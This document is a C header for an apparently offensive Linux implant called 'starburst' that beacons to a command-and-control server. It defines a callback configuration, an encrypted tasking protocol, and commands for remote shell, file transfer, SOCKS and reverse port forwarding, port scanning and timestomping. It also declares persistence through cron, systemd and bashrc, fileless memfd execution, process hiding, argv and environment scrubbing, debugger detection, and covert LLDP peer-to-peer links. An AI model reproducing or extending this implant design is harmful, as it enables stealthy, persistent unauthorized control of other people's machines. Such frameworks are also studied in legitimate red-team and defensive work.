#ifndef STARBURST_LINUX_H
#define STARBURST_LINUX_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <pwd.h>
#include <grp.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#if OPENSSL_VERSION_NUMBER >= 0x30000000L
#include <openssl/provider.h>
#endif

/* ================================================================
 *  COMPILE-TIME CONFIG
 * ================================================================ */
#ifndef CFG_PAYLOAD_UUID
#define CFG_PAYLOAD_UUID "PAYLOAD_UUID_HERE_00000000000000"
#endif
#ifndef CFG_AES_KEY_HEX
#define CFG_AES_KEY_HEX "0000000000000000000000000000000000000000000000000000000000000000"
#endif
#ifndef CFG_CALLBACK_HOST
#define CFG_CALLBACK_HOST "127.0.0.1"
#endif
#ifndef CFG_CALLBACK_PORT
#define CFG_CALLBACK_PORT 9443
#endif
#ifndef CFG_POST_URI
#define CFG_POST_URI "agent_message"
#endif
#ifndef CFG_SLEEP_INTERVAL
#define CFG_SLEEP_INTERVAL 5
#endif
#ifndef CFG_SLEEP_JITTER
#define CFG_SLEEP_JITTER 0
#endif
#ifndef CFG_USE_SSL
#define CFG_USE_SSL 1
#endif

/* P2P transport config (set by builder for LLDP_TRANSPORT / TCP_TRANSPORT) */
#ifndef CFG_LLDP_IFACE
#define CFG_LLDP_IFACE "eth0"
#endif
#ifndef CFG_LLDP_OUI_0
#define CFG_LLDP_OUI_0 0x00
#endif
#ifndef CFG_LLDP_OUI_1
#define CFG_LLDP_OUI_1 0x00
#endif
#ifndef CFG_LLDP_OUI_2
#define CFG_LLDP_OUI_2 0x0C
#endif
#ifndef CFG_LLDP_SUBTYPE
#define CFG_LLDP_SUBTYPE 0x01
#endif
#ifndef CFG_LLDP_PEER_IP
#define CFG_LLDP_PEER_IP ""
#endif
#ifndef CFG_TCP_BIND_PORT
#define CFG_TCP_BIND_PORT 7000
#endif

/* ================================================================
 *  PROTOCOL CONSTANTS
 * ================================================================ */
#define ACTION_CHECKIN       0x01
#define ACTION_GET_TASKING   0x02
#define ACTION_POST_RESPONSE 0x03
#define ACTION_CHECKIN_RSP   0x04
#define ACTION_LINK_ADD      0x05
#define ACTION_LINK_MSG      0x06
#define ACTION_LINK_REMOVE   0x07
#define ACTION_SOCKS_MSG     0x08
#define ACTION_RPFWD_MSG     0x09

#define RSP_SUCCESS    0x00
#define RSP_ERROR      0x01
#define RSP_PROCESSING 0x02

#define DOWNLOAD_INIT      0x10
#define DOWNLOAD_CHUNK     0x11
#define UPLOAD_REQUEST     0x12
#define UPLOAD_CHUNK_RSP   0x13
#define DOWNLOAD_RESP_CMD  0x2C

#define C2_PROFILE_TCP     0x01
#define C2_PROFILE_LLDP    0x02

/* ================================================================
 *  COMMAND IDs
 * ================================================================ */
#define CMD_EXIT       0x01
#define CMD_SLEEP      0x02
#define CMD_SHELL      0x03
#define CMD_UPLOAD     0x04
#define CMD_DOWNLOAD   0x05
#define CMD_LS         0x06
#define CMD_CD         0x07
#define CMD_PWD        0x08
#define CMD_PS         0x09
#define CMD_WHOAMI     0x0A
#define CMD_CONFIG     0x0B
#define CMD_CAT        0x0E
#define CMD_MKDIR      0x0F
#define CMD_RM         0x10
#define CMD_CP         0x11
#define CMD_MV         0x12
#define CMD_ENV        0x13
#define CMD_IFCONFIG   0x1D
#define CMD_NETSTAT    0x1E
#define CMD_KILL       0x1F
#define CMD_RUN        0x20
#define CMD_SOCKS      0x2D
#define CMD_RPFWD      0x2F
#define CMD_TIMESTOMP  0x34
#define CMD_LOCALTIME  0x35
#define CMD_GETUID     0x37
#define CMD_CONNECT    0x39
#define CMD_DISCONNECT 0x3A
#define CMD_UPTIME     0x41
#define CMD_PORTSCAN   0x52

/* linux-specific */
#define CMD_PERSIST_CRON     0x60
#define CMD_PERSIST_SYSTEMD  0x61
#define CMD_PERSIST_BASHRC   0x62
#define CMD_MEMFD_EXEC       0x63

/* ================================================================
 *  LIMITS
 * ================================================================ */
#define MAX_TLV_SIZE       (4 * 1024 * 1024)
#define CHUNK_SIZE         (512 * 1024)
#define MAX_DOWNLOADS      4
#define MAX_JOBS           16
#define RPFWD_MAX_CONNS    64
#define RPFWD_RECV_BUF     65536
#define SOCKS_MAX_CONNS    128
#define SOCKS_RECV_BUF     65536
#define TCP_P2P_MAX_LINKS  8
#define TCP_RECV_BUF_MAX   65536
#define LLDP_MAX_LINKS     8

#define CMD_LLDP_CONNECT    0x70
#define CMD_LLDP_DISCONNECT 0x71

/* ================================================================
 *  TLV TYPES
 * ================================================================ */
typedef struct {
    uint8_t *data;
    uint32_t len;
    uint32_t cap;
} packer_t;

typedef struct {
    const uint8_t *data;
    uint32_t len;
    uint32_t off;
} parser_t;

/* ================================================================
 *  DATA STRUCTURES
 * ================================================================ */
typedef struct {
    char task_uuid[40];
    char file_path[1024];
    FILE *fp;
    uint32_t total_size;
    uint32_t sent;
    char file_id[40];
    int active;
    int awaiting_file_id;
} download_slot_t;

typedef struct {
    uint32_t server_id;
    int      sock;
    int      active;
    int      connected;
} proxy_conn_t;

typedef struct lldp_link {
    char     task_uuid[40];
    char     agent_id[40];
    uint32_t link_id;
    uint8_t  peer_mac[6];
    int      connected;
    uint32_t rx_msg_id;
    uint16_t rx_total;
    uint16_t rx_received;
    uint8_t  *rx_chunks[256];
    uint16_t rx_chunk_lens[256];
    uint8_t  rx_chunk_present[256];
    struct lldp_link *next;
} lldp_link_t;

typedef struct tcp_link {
    char     task_uuid[40];
    char     agent_id[40];
    char     hostname[256];
    uint32_t link_id;
    int      sock;
    uint16_t port;
    int      connected;
    struct tcp_link *next;
} tcp_link_t;

/* job system */
typedef enum {
    JOB_STATUS_IDLE = 0,
    JOB_STATUS_RUNNING,
    JOB_STATUS_COMPLETE,
} job_status_t;

typedef struct {
    char         task_uuid[40];
    uint8_t      cmd_id;
    pthread_t    thread;
    job_status_t status;
    int          active;
} job_entry_t;

/* ================================================================
 *  GLOBAL AGENT STATE
 * ================================================================ */
typedef struct {
    /* identity */
    char     uuid[40];
    uint8_t  aes_key[32];

    /* beacon config */
    int      sleep_interval;
    int      sleep_jitter;
    uint32_t killdate;
    int      running;

    /* transport - HTTPS / HTTP */
    SSL_CTX *ssl_ctx;
    int      use_ssl;
    char     callback_host[256];
    int      callback_port;
    char     post_uri[256];

    /* response queue (mutex-protected for threaded commands) */
    uint8_t  *rsp_buf;
    uint32_t rsp_len;
    uint32_t rsp_cap;
    pthread_mutex_t rsp_mutex;

    /* downloads */
    download_slot_t downloads[MAX_DOWNLOADS];

    /* rpfwd */
    struct {
        proxy_conn_t conns[RPFWD_MAX_CONNS];
        uint32_t     conn_count;
        int          active;
        int          saved_sleep;
        char         target_host[256];
        uint16_t     target_port;
    } rpfwd;

    /* socks */
    struct {
        proxy_conn_t conns[SOCKS_MAX_CONNS];
        uint32_t     conn_count;
        int          active;
        int          saved_sleep;
    } socks;

    /* TCP P2P links */
    tcp_link_t *tcp_links;
    int         tcp_listen_sock;
    int         tcp_listen_port;

    /* LLDP P2P links */
    lldp_link_t *lldp_links;
    int          lldp_sock;
    int          lldp_ifindex;
    uint8_t      lldp_oui[3];
    uint8_t      lldp_subtype;
    uint8_t      lldp_src_mac[6];
    char         lldp_iface[32];
    uint8_t      lldp_peer_mac[6];
    int          lldp_has_peer;

    /* P2P child transport (parent connection) */
    int          p2p_parent_sock;

    /* job tracking */
    job_entry_t jobs[MAX_JOBS];
    pthread_mutex_t jobs_mutex;

    /* opsec */
    int proc_hidden;
} agent_state_t;

extern agent_state_t g_state;

/* ================================================================
 *  TLV FUNCTIONS (tlv.c)
 * ================================================================ */
void pk_init(packer_t *p);
void pk_ensure(packer_t *p, uint32_t need);
void pk_byte(packer_t *p, uint8_t v);
void pk_int32(packer_t *p, uint32_t v);
void pk_bytes(packer_t *p, const uint8_t *d, uint32_t dlen);
void pk_string(packer_t *p, const char *s);
void pk_free(packer_t *p);

void pr_init(parser_t *p, const uint8_t *data, uint32_t len);
uint8_t pr_byte(parser_t *p);
uint32_t pr_int32(parser_t *p);
const uint8_t *pr_bytes(parser_t *p, uint32_t *out_len);
char *pr_string(parser_t *p);
void pr_raw(parser_t *p, uint8_t *out, uint32_t count);
uint32_t pr_remaining(parser_t *p);

/* ================================================================
 *  CRYPTO FUNCTIONS (crypto.c)
 * ================================================================ */
void hex_to_bytes(const char *hex, uint8_t *out, int len);
char *b64_encode(const uint8_t *data, size_t len, size_t *out_len);
uint8_t *b64_decode(const char *input, size_t in_len, size_t *out_len);
uint8_t *aes_encrypt(const uint8_t *plaintext, uint32_t pt_len, uint32_t *out_len);
uint8_t *aes_decrypt(const uint8_t *blob, uint32_t blob_len, uint32_t *out_len);

/* ================================================================
 *  TRANSPORT FUNCTIONS (transport.c)
 * ================================================================ */
int ssl_init(void);
uint8_t *https_post(const char *host, int port, const char *uri,
                     const uint8_t *body, uint32_t body_len, uint32_t *resp_len);
uint8_t *agent_send(const uint8_t *tlv, uint32_t tlv_len, uint32_t *out_len);

/* ================================================================
 *  TCP P2P FUNCTIONS (transport_tcp.c)
 * ================================================================ */
int tcp_p2p_init_listener(int port);
void tcp_p2p_poll_links(void);
void tcp_p2p_destroy(void);
int tcp_p2p_link_send(tcp_link_t *link, const uint8_t *data, uint32_t len);
int tcp_p2p_link_recv(int sock, uint8_t **data, uint32_t *len);
void cmd_connect_handler(const char *task_uuid, parser_t *params);
void cmd_disconnect_handler(const char *task_uuid, parser_t *params);

/* ================================================================
 *  LLDP P2P FUNCTIONS (transport_lldp.c)
 * ================================================================ */
void lldp_p2p_poll_links(void);
void lldp_p2p_destroy(void);
int  lldp_p2p_link_send(lldp_link_t *link, const uint8_t *data, uint32_t len);
void cmd_lldp_connect_handler(const char *task_uuid, parser_t *params);
void cmd_lldp_disconnect_handler(const char *task_uuid, parser_t *params);
int  lldp_p2p_child_init(void);
uint8_t *lldp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len);

/* ================================================================
 *  TCP P2P CHILD FUNCTIONS (transport_tcp.c)
 * ================================================================ */
int  tcp_p2p_child_accept(void);
uint8_t *tcp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len);

/* ================================================================
 *  RESPONSE QUEUE (main.c)
 * ================================================================ */
void rsp_queue(const uint8_t *data, uint32_t dlen);
void queue_response(const char *task_uuid, uint8_t status, const char *output);

/* ================================================================
 *  COMMAND DISPATCH (commands.c)
 * ================================================================ */
void dispatch_task(uint8_t cmd_id, const char *task_uuid,
                   const uint8_t *param_data, uint32_t param_len);

/* ================================================================
 *  PROXY FUNCTIONS (proxy.c)
 * ================================================================ */
void rpfwd_poll(void);
void rpfwd_destroy(void);
void rpfwd_route(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit);
void cmd_rpfwd_handler(const char *task_uuid, parser_t *params);

void socks_poll(void);
void socks_destroy(void);
void socks_route(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit);
void cmd_socks_handler(const char *task_uuid, parser_t *params);

/* ================================================================
 *  PERSISTENCE FUNCTIONS (persist.c)
 * ================================================================ */
void cmd_persist_cron(const char *task_uuid, parser_t *params);
void cmd_persist_systemd(const char *task_uuid, parser_t *params);
void cmd_persist_bashrc(const char *task_uuid, parser_t *params);

/* ================================================================
 *  OPSEC FUNCTIONS (opsec.c)
 * ================================================================ */
void opsec_init(void);
void opsec_hide_proc(void);
void opsec_scrub_argv(int argc, char **argv);
void opsec_scrub_environ(void);
int  opsec_detect_debugger(void);
void cmd_memfd_exec(const char *task_uuid, parser_t *params);
void cmd_timestomp_handler(const char *task_uuid, parser_t *params);

/* ================================================================
 *  JOB SYSTEM (jobs.c)
 * ================================================================ */
int  job_create(const char *task_uuid, uint8_t cmd_id, void *(*func)(void *), void *arg);
void job_complete(const char *task_uuid);
void cmd_jobkill_handler(const char *task_uuid, parser_t *params);

/* ================================================================
 *  DEBUG MACROS
 * ================================================================ */
#ifdef DEBUG_BUILD
  #define DBG(fmt, ...) fprintf(stderr, "[starburst] " fmt "\n", ##__VA_ARGS__)
#else
  #define DBG(fmt, ...) ((void)0)
#endif

#endif /* STARBURST_LINUX_H */
